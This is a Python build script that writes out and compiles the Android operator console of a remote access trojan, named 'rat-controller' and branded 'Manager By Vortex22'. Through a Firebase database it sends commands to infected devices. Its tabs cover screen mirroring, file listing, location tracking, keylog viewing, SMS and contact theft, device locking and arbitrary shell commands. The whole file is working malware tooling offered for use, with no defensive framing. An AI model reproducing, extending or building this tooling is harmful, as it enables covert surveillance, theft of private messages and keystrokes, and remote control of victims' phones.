#!/usr/bin/env python3
# c2.py — builder controller.apk
# Manager By Vortex22

# ============================================================
# CONFIG — ISI DI SINI
# ============================================================
FIREBASE_DB_URL    = "https://YOUR-PROJECT-default-rtdb.firebaseio.com"
FIREBASE_STORAGE   = "YOUR-PROJECT.appspot.com"
FIREBASE_API_KEY   = "YOUR_WEB_API_KEY"
APP_NAME           = "Manager By Vortex22"
PACKAGE_NAME       = "com.vortex22.manager"
MIN_SDK            = 24
TARGET_SDK         = 33
COMPILE_SDK        = 33
# ============================================================

import os
import shutil
import subprocess
import tempfile
import argparse
from pathlib import Path

ROOT = Path(__file__).parent.resolve()
OUTPUT_DIR = ROOT / "output"

# ============================================================
# SOURCE: AndroidManifest.xml
# ============================================================
MANIFEST = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>

    <application
        android:allowBackup="false"
        android:label="''' + APP_NAME + '''"
        android:icon="@mipmap/ic_launcher"
        android:usesCleartextTraffic="true"
        android:theme="@style/AppTheme">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:configChanges="orientation|screenSize|keyboardHidden">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

    </application>
</manifest>
'''

# ============================================================
# SOURCE: build.gradle
# ============================================================
BUILD_GRADLE = '''apply plugin: 'com.android.application'

android {
    namespace "''' + PACKAGE_NAME + '''"
    compileSdk ''' + str(COMPILE_SDK) + '''

    defaultConfig {
        applicationId "''' + PACKAGE_NAME + '''"
        minSdk ''' + str(MIN_SDK) + '''
        targetSdk ''' + str(TARGET_SDK) + '''
        versionCode 1
        versionName "1.0"
        multiDexEnabled true
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }

    packagingOptions {
        pickFirst 'META-INF/*'
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'androidx.viewpager:viewpager:1.0.0'
    implementation 'androidx.fragment:fragment:1.6.2'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'com.google.firebase:firebase-database:20.3.0'
    implementation 'com.google.firebase:firebase-storage:20.3.0'
    implementation 'com.google.firebase:firebase-auth:22.3.0'
    implementation 'com.google.firebase:firebase-core:21.1.1'
    implementation 'io.github.webrtc-sdk:android:125.6422.03'
    implementation 'com.squareup.okhttp3:okhttp:4.11.0'
    implementation 'com.github.bumptech.glide:glide:4.16.0'
}

apply plugin: 'com.google.gms.google-services'
'''

SETTINGS_GRADLE = 'rootProject.name = "rat-controller"\ninclude \':app\'\n'

ROOT_BUILD_GRADLE = '''buildscript {
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:8.1.0'
        classpath 'com.google.gms:google-services:4.4.0'
    }
}
allprojects {
    repositories {
        google()
        mavenCentral()
        maven { url 'https://jitpack.io' }
    }
}
'''

GRADLE_PROPERTIES = '''org.gradle.jvmargs=-Xmx3072m
android.useAndroidX=true
android.enableJetifier=true
'''

STRINGS_XML = '''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">''' + APP_NAME + '''</string>
</resources>
'''

STYLES_XML = '''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <style name="AppTheme" parent="Theme.MaterialComponents.DayNight.NoActionBar">
        <item name="colorPrimary">#1e1e1e</item>
        <item name="colorPrimaryDark">#000000</item>
        <item name="colorAccent">#00e676</item>
        <item name="android:windowBackground">#0d0d0d</item>
    </style>
</resources>
'''

PROGUARD = '''
-keep class org.webrtc.** { *; }
-keep class com.google.firebase.** { *; }
'''

GOOGLE_SERVICES_JSON = '''{
  "project_info": {
    "project_number": "REPLACE",
    "project_id": "REPLACE",
    "storage_bucket": "''' + FIREBASE_STORAGE + '''"
  },
  "client": [
    {
      "client_info": {
        "mobilesdk_app_id": "REPLACE",
        "android_client_info": {
          "package_name": "''' + PACKAGE_NAME + '''"
        }
      },
      "api_key": [
        {
          "current_key": "''' + FIREBASE_API_KEY + '''"
        }
      ]
    }
  ],
  "configuration_version": "1"
}
'''

# ============================================================
# SOURCE: MainActivity.java
# ============================================================
MAIN_ACTIVITY = '''package ''' + PACKAGE_NAME + ''';

import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import androidx.fragment.app.FragmentPagerAdapter;
import androidx.viewpager.widget.ViewPager;
import com.google.android.material.tabs.TabLayout;

public class MainActivity extends AppCompatActivity {
    ViewPager pager;
    TabLayout tabs;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);
        tabs = findViewById(R.id.tabs);
        pager = findViewById(R.id.pager);
        pager.setAdapter(new Pager(getSupportFragmentManager()));
        tabs.setupWithViewPager(pager);
    }

    static class Pager extends FragmentPagerAdapter {
        Pager(FragmentManager fm) { super(fm, BEHAVIOR_RESUME_ONLY_CURRENT_FRAGMENT); }
        @Override public Fragment getItem(int i) {
            switch (i) {
                case 0: return new DevicesFragment();
                case 1: return new MirrorFragment();
                case 2: return new FilesFragment();
                case 3: return new LocationFragment();
                case 4: return new KeylogFragment();
                case 5: return new SmsFragment();
                case 6: return new ContactsFragment();
                case 7: return new LogsFragment();
                case 8: return new SettingsFragment();
            }
            return new DevicesFragment();
        }
        @Override public int getCount() { return 9; }
        @Override public CharSequence getPageTitle(int i) {
            String[] t = {"Devices","Mirror","Files","Location","Keylog","SMS","Contacts","Logs","Settings"};
            return t[i];
        }
    }
}
'''

# ============================================================
# SOURCE: Selected.java
# ============================================================
SELECTED = '''package ''' + PACKAGE_NAME + ''';

public class Selected {
    public static volatile String deviceId = null;
    public static volatile String deviceLabel = null;
}
'''

# ============================================================
# SOURCE: Cmd.java
# ============================================================
CMD = '''package ''' + PACKAGE_NAME + ''';

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.Map;

public class Cmd {
    public static String send(String type, String args) {
        String id = Selected.deviceId;
        if (id == null) return "err:no device selected";
        DatabaseReference ref = FirebaseDatabase.getInstance()
                .getReference().child("devices").child(id).child("commands").push();
        Map<String, Object> m = new HashMap<>();
        m.put("type", type);
        m.put("args", args == null ? "" : args);
        m.put("status", "pending");
        m.put("ts", System.currentTimeMillis());
        ref.setValue(m);
        return ref.getKey();
    }
}
'''

# ============================================================
# SOURCE: DevicesFragment.java
# ============================================================
DEVICES_FRAGMENT = '''package ''' + PACKAGE_NAME + ''';

import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.ArrayList;

public class DevicesFragment extends Fragment {
    ListView list;
    ArrayAdapter<String> adapter;
    ArrayList<String> ids = new ArrayList<>();
    ArrayList<String> labels = new ArrayList<>();
    TextView header;
    DatabaseReference root;

    @Nullable @Override
    public View onCreateView(@NonNull LayoutInflater inf, @Nullable ViewGroup c, @Nullable Bundle b) {
        View v = inf.inflate(R.layout.fragment_devices, c, false);
        list = v.findViewById(R.id.list);
        header = v.findViewById(R.id.header);
        adapter = new ArrayAdapter<>(getContext(), android.R.layout.simple_list_item_1, labels);
        list.setAdapter(adapter);
        list.setOnItemClickListener((parent, view, pos, id) -> {
            Selected.deviceId = ids.get(pos);
            Selected.deviceLabel = labels.get(pos);
            Toast.makeText(getContext(), "Selected: " + Selected.deviceId, Toast.LENGTH_SHORT).show();
            header.setText("Selected: " + Selected.deviceId);
        });
        root = FirebaseDatabase.getInstance().getReference().child("devices");
        return v;
    }

    @Override public void onResume() {
        super.onResume();
        root.addValueEventListener(new ValueEventListener() {
            @Override public void onDataChange(@NonNull DataSnapshot s) {
                ids.clear(); labels.clear();
                for (DataSnapshot d : s.getChildren()) {
                    ids.add(d.getKey());
                    String model = d.child("info").child("model").getValue(String.class);
                    String brand = d.child("info").child("brand").getValue(String.class);
                    Boolean online = d.child("online").getValue(Boolean.class);
                    String prefix = (online != null && online) ? "[ON] " : "[OFF] ";
                    labels.add(prefix + (brand != null ? brand : "") + " " + (model != null ? model : "?") + "\\n" + d.getKey());
                }
                adapter.notifyDataSetChanged();
            }
            @Override public void onCancelled(@NonNull DatabaseError e) {}
        });
    }
}
'''

# ============================================================
# SOURCE: MirrorFragment.java
# ============================================================
MIRROR_FRAGMENT = '''package ''' + PACKAGE_NAME + ''';

import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.HorizontalScrollView;
import android.widget.LinearLayout;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import org.webrtc.SurfaceViewRenderer;

public class MirrorFragment extends Fragment {
    SurfaceViewRenderer renderer;
    LinearLayout cmdBar;
    EditText input;

    @Nullable @Override
    public View onCreateView(@NonNull LayoutInflater inf, @Nullable ViewGroup c, @Nullable Bundle b) {
        LinearLayout ll = new LinearLayout(getContext());
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setBackgroundColor(0xFF000000);

        renderer = new SurfaceViewRenderer(getContext());
        ll.addView(renderer, new LinearLayout.LayoutParams(-1, 0, 1f));

        cmdBar = new LinearLayout(getContext());
        cmdBar.setOrientation(LinearLayout.HORIZONTAL);

        String[][] btns = {
                {"Start",   "mirror_start", ""},
                {"Stop",    "mirror_stop",  ""},
                {"Lock",    "lock",         ""},
                {"Vibrate", "vibrate",      ""},
                {"Flash",   "flash",        ""},
                {"Back",    "key_back",     ""},
                {"Home",    "key_home",     ""},
                {"Recents", "key_recents",  ""}
        };

        for (String[] bt : btns) {
            Button btn = new Button(getContext());
            btn.setText(bt[0]);
            final String type = bt[1];
            final String args = bt[2];
            btn.setOnClickListener(v -> {
                if (Selected.deviceId == null) {
                    Toast.makeText(getContext(), "Select device first", Toast.LENGTH_SHORT).show();
                    return;
                }
                String key = Cmd.send(type, args);
                Toast.makeText(getContext(), "sent: " + type + " (" + key + ")", Toast.LENGTH_SHORT).show();
            });
            cmdBar.addView(btn);
        }

        HorizontalScrollView hsv = new HorizontalScrollView(getContext());
        hsv.addView(cmdBar);
        ll.addView(hsv);

        LinearLayout inputRow = new LinearLayout(getContext());
        inputRow.setOrientation(LinearLayout.HORIZONTAL);
        input = new EditText(getContext());
        input.setHint("text / url / shell command");
        input.setLayoutParams(new LinearLayout.LayoutParams(0, -2, 1f));
        Button send = new Button(getContext());
        send.setText("Send");
        send.setOnClickListener(v -> {
            String t = input.getText().toString().trim();
            if (t.isEmpty()) return;
            if (Selected.deviceId == null) {
                Toast.makeText(getContext(), "Select device first", Toast.LENGTH_SHORT).show();
                return;
            }
            Cmd.send("shell", t);
            input.setText("");
        });
        inputRow.addView(input);
        inputRow.addView(send);
        ll.addView(inputRow);

        return ll;
    }
}
'''

# ============================================================
# SOURCE: FilesFragment.java
# ============================================================
FILES_FRAGMENT = '''package ''' + PACKAGE_NAME + ''';

import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class FilesFragment extends Fragment {
    TextView output;
    EditText path;

    @Nullable @Override
    public View onCreateView(@NonNull LayoutInflater inf, @Nullable ViewGroup c, @Nullable Bundle b) {
        LinearLayout ll = new LinearLayout(getContext());
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20,20,20,20);

        EditText input = new EditText(getContext());
        input.setHint("/sdcard");
        input.setText("/sdcard");
        Button btn = new Button(getContext());
        btn.setText("List");
        output = new TextView(getContext());
        output.setTextIsSelectable(true);

        btn.setOnClickListener(v -> {
            Cmd.send("files", input.getText().toString());
        });

        ll.addView(input);
        ll.addView(btn);
        ll.addView(output, new LinearLayout.LayoutParams(-1, -1));
        return ll;
    }
}
'''

# ============================================================
# SOURCE: LocationFragment.java
# ============================================================
LOCATION_FRAGMENT = '''package ''' + PACKAGE_NAME + ''';

import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class LocationFragment extends Fragment {
    TextView output;
    @Nullable @Override
    public View onCreateView(@NonNull LayoutInflater inf, @Nullable ViewGroup c, @Nullable Bundle b) {
        LinearLayout ll = new LinearLayout(getContext());
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20,20,20,20);
        Button btn = new Button(getContext());
        btn.setText("Get Location");
        output = new TextView(getContext());
        output.setTextIsSelectable(true);
        btn.setOnClickListener(v -> Cmd.send("location", ""));
        ll.addView(btn);
        ll.addView(output, new LinearLayout.LayoutParams(-1, -1));
        return ll;
    }
}
'''

# ============================================================
# SOURCE: KeylogFragment.java
# ============================================================
KEYLOG_FRAGMENT = '''package ''' + PACKAGE_NAME + ''';

import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

public class KeylogFragment extends Fragment {
    TextView output;
    DatabaseReference ref;

    @Nullable @Override
    public View onCreateView(@NonNull LayoutInflater inf, @Nullable ViewGroup c, @Nullable Bundle b) {
        LinearLayout ll = new LinearLayout(getContext());
        ll.setOrientation(LinearLayout.VERTICAL);
        output = new TextView(getContext());
        output.setTextIsSelectable(true);
        output.setPadding(20,20,20,20);
        ll.addView(output, new LinearLayout.LayoutParams(-1, -1));
        return ll;
    }

    @Override public void onResume() {
        super.onResume();
        if (Selected.deviceId == null) return;
        ref = FirebaseDatabase.getInstance().getReference()
                .child("devices").child(Selected.deviceId).child("keylog");
        ref.limitToLast(100).addValueEventListener(new ValueEventListener() {
            @Override public void onDataChange(@NonNull DataSnapshot s) {
                StringBuilder sb = new StringBuilder();
                for (DataSnapshot d : s.getChildren()) {
                    String v = d.getValue(String.class);
                    if (v != null) sb.append(v).append("\\n");
                }
                output.setText(sb.toString());
            }
            @Override public void onCancelled(@NonNull DatabaseError e) {}
        });
    }
}
'''

# ============================================================
# SOURCE: SmsFragment.java
# ============================================================
SMS_FRAGMENT = '''package ''' + PACKAGE_NAME + ''';

import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class SmsFragment extends Fragment {
    TextView output;
    @Nullable @Override
    public View onCreateView(@NonNull LayoutInflater inf, @Nullable ViewGroup c, @Nullable Bundle b) {
        LinearLayout ll = new LinearLayout(getContext());
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20,20,20,20);
        Button btn = new Button(getContext());
        btn.setText("Fetch SMS");
        output = new TextView(getContext());
        output.setTextIsSelectable(true);
        btn.setOnClickListener(v -> Cmd.send("sms", ""));
        ll.addView(btn);
        ll.addView(output, new LinearLayout.LayoutParams(-1, -1));
        return ll;
    }
}
'''

# ============================================================
# SOURCE: ContactsFragment.java
# ============================================================
CONTACTS_FRAGMENT = '''package ''' + PACKAGE_NAME + ''';

import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class ContactsFragment extends Fragment {
    TextView output;
    @Nullable @Override
    public View onCreateView(@NonNull LayoutInflater inf, @Nullable ViewGroup c, @Nullable Bundle b) {
        LinearLayout ll = new LinearLayout(getContext());
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20,20,20,20);
        Button btn = new Button(getContext());
        btn.setText("Fetch Contacts");
        output = new TextView(getContext());
        output.setTextIsSelectable(true);
        btn.setOnClickListener(v -> Cmd.send("contacts", ""));
        ll.addView(btn);
        ll.addView(output, new LinearLayout.LayoutParams(-1, -1));
        return ll;
    }
}
'''

# ============================================================
# SOURCE: LogsFragment.java
# ============================================================
LOGS_FRAGMENT = '''package ''' + PACKAGE_NAME + ''';

import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

public class LogsFragment extends Fragment {
    TextView output;
    @Nullable @Override
    public View onCreateView(@NonNull LayoutInflater inf, @Nullable ViewGroup c, @Nullable Bundle b) {
        LinearLayout ll = new LinearLayout(getContext());
        ll.setOrientation(LinearLayout.VERTICAL);
        output = new TextView(getContext());
        output.setTextIsSelectable(true);
        output.setPadding(20,20,20,20);
        ll.addView(output, new LinearLayout.LayoutParams(-1, -1));
        return ll;
    }

    @Override public void onResume() {
        super.onResume();
        if (Selected.deviceId == null) return;
        DatabaseReference ref = FirebaseDatabase.getInstance().getReference()
                .child("devices").child(Selected.deviceId).child("commands");
        ref.limitToLast(50).addValueEventListener(new ValueEventListener() {
            @Override public void onDataChange(@NonNull DataSnapshot s) {
                StringBuilder sb = new StringBuilder();
                for (DataSnapshot d : s.getChildren()) {
                    String type = d.child("type").getValue(String.class);
                    String status = d.child("status").getValue(String.class);
                    String result = d.child("result").getValue(String.class);
                    sb.append("[").append(status).append("] ").append(type).append("\\n");
                    if (result != null) sb.append(result).append("\\n---\\n");
                }
                output.setText(sb.toString());
            }
            @Override public void onCancelled(@NonNull DatabaseError e) {}
        });
    }
}
'''

# ============================================================
# SOURCE: SettingsFragment.java
# ============================================================
SETTINGS_FRAGMENT = '''package ''' + PACKAGE_NAME + ''';

import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class SettingsFragment extends Fragment {
    @Nullable @Override
    public View onCreateView(@NonNull LayoutInflater inf, @Nullable ViewGroup c, @Nullable Bundle b) {
        LinearLayout ll = new LinearLayout(getContext());
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20,20,20,20);
        TextView tv = new TextView(getContext());
        tv.setText("Manager By Vortex22\\nVersion 1.0\\n\\nSelect a device in the Devices tab first.");
        ll.addView(tv);
        return ll;
    }
}
'''

# ============================================================
# RESOURCE LAYOUTS
# ============================================================
LAYOUT_MAIN = '''<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="vertical"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#0d0d0d">

    <com.google.android.material.tabs.TabLayout
        android:id="@+id/tabs"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:background="#1e1e1e"
        app:tabMode="scrollable"
        app:tabTextColor="#aaaaaa"
        app:tabSelectedTextColor="#00e676"
        xmlns:app="http://schemas.android.com/apk/res-auto"/>

    <androidx.viewpager.widget.ViewPager
        android:id="@+id/pager"
        android:layout_width="match_parent"
        android:layout_height="0dp"
        android:layout_weight="1"/>

</LinearLayout>
'''

LAYOUT_DEVICES = '''<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="vertical"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#0d0d0d">

    <TextView
        android:id="@+id/header"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:padding="16dp"
        android:text="Devices"
        android:textColor="#00e676"
        android:textSize="16sp"/>

    <ListView
        android:id="@+id/list"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:background="#1a1a1a"/>

</LinearLayout>
'''

# ============================================================
# FILE WRITER
# ============================================================
def write(path, content):
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)

def generate_sources(base):
    base = Path(base)
    write(base / "settings.gradle", SETTINGS_GRADLE)
    write(base / "build.gradle", ROOT_BUILD_GRADLE)
    write(base / "gradle.properties", GRADLE_PROPERTIES)
    write(base / "local.properties",
          'sdk.dir=' + str(Path.home() / "scoop" / "apps" / "android-clt" / "current").replace("\\", "\\\\"))
    write(base / "gradle" / "wrapper" / "gradle-wrapper.properties",
          'distributionUrl=https\\://services.gradle.org/distributions/gradle-8.9-bin.zip\n')

    app = base / "app"
    write(app / "build.gradle", BUILD_GRADLE)
    write(app / "proguard-rules.pro", PROGUARD)

    real_gs = ROOT / "google-services-controller.json"
    if real_gs.exists():
        shutil.copy(real_gs, app / "google-services.json")
        print("[+] using google-services-controller.json")
    else:
        write(app / "google-services.json", GOOGLE_SERVICES_JSON)
        print("[!] placeholder google-services.json used. replace later.")

    main = app / "src" / "main"
    write(main / "AndroidManifest.xml", MANIFEST)

    java = main / "java" / Path(PACKAGE_NAME.replace(".", "/"))
    write(java / "MainActivity.java", MAIN_ACTIVITY)
    write(java / "Selected.java", SELECTED)
    write(java / "Cmd.java", CMD)
    write(java / "DevicesFragment.java", DEVICES_FRAGMENT)
    write(java / "MirrorFragment.java", MIRROR_FRAGMENT)
    write(java / "FilesFragment.java", FILES_FRAGMENT)
    write(java / "LocationFragment.java", LOCATION_FRAGMENT)
    write(java / "KeylogFragment.java", KEYLOG_FRAGMENT)
    write(java / "SmsFragment.java", SMS_FRAGMENT)
    write(java / "ContactsFragment.java", CONTACTS_FRAGMENT)
    write(java / "LogsFragment.java", LOGS_FRAGMENT)
    write(java / "SettingsFragment.java", SETTINGS_FRAGMENT)

    res = main / "res"
    write(res / "values" / "strings.xml", STRINGS_XML)
    write(res / "values" / "styles.xml", STYLES_XML)
    write(res / "layout" / "activity_main.xml", LAYOUT_MAIN)
    write(res / "layout" / "fragment_devices.xml", LAYOUT_DEVICES)
    for d in ["mipmap-hdpi","mipmap-mdpi","mipmap-xhdpi","mipmap-xxhdpi","mipmap-xxxhdpi"]:
        (res / d).mkdir(parents=True, exist_ok=True)
    print("[+] sources generated at", base)

# ============================================================
# BUILD
# ============================================================
def build():
    print("[*] building controller.apk ...")
    OUTPUT_DIR.mkdir(exist_ok=True)
    with tempfile.TemporaryDirectory() as tmp:
        tmp_path = Path(tmp)
        generate_sources(tmp_path)

        for f in ["gradlew", "gradlew.bat"]:
            src = ROOT / f
            if src.exists(): shutil.copy(src, tmp_path / f)

        jar = ROOT / "gradle" / "wrapper" / "gradle-wrapper.jar"
        if jar.exists():
            (tmp_path / "gradle" / "wrapper").mkdir(parents=True, exist_ok=True)
            shutil.copy(jar, tmp_path / "gradle" / "wrapper" / "gradle-wrapper.jar")

        assets = ROOT / "assets"
        if assets.exists():
            for f in assets.glob("*.png"):
                for d in (tmp_path / "app" / "src" / "main" / "res").glob("mipmap-*"):
                    shutil.copy(f, d / "ic_launcher.png")

        gradlew = tmp_path / ("gradlew.bat" if os.name == "nt" else "gradlew")
        if not gradlew.exists():
            print("[!] gradlew not found in RAT/. run gradle wrapper first.")
            return

        r = subprocess.run([str(gradlew), "assembleRelease", "--no-daemon"], cwd=tmp_path)
        if r.returncode != 0:
            print("[!] build failed")
            return

        apk = tmp_path / "app" / "build" / "outputs" / "apk" / "release" / "app-release-unsigned.apk"
        if not apk.exists():
            print("[!] apk not found")
            return

        out = OUTPUT_DIR / "controller.apk"
        shutil.copy(apk, out)
        print("[+] built:", out)

# ============================================================
# CLI
# ============================================================
def main():
    p = argparse.ArgumentParser()
    p.add_argument("action", choices=["build", "gen", "clean"])
    args = p.parse_args()
    if args.action == "gen":
        generate_sources(ROOT / "controller_src")
    elif args.action == "build":
        build()
    elif args.action == "clean":
        if (ROOT / "controller_src").exists():
            shutil.rmtree(ROOT / "controller_src")
        print("[+] cleaned")

if __name__ == "__main__":
    main()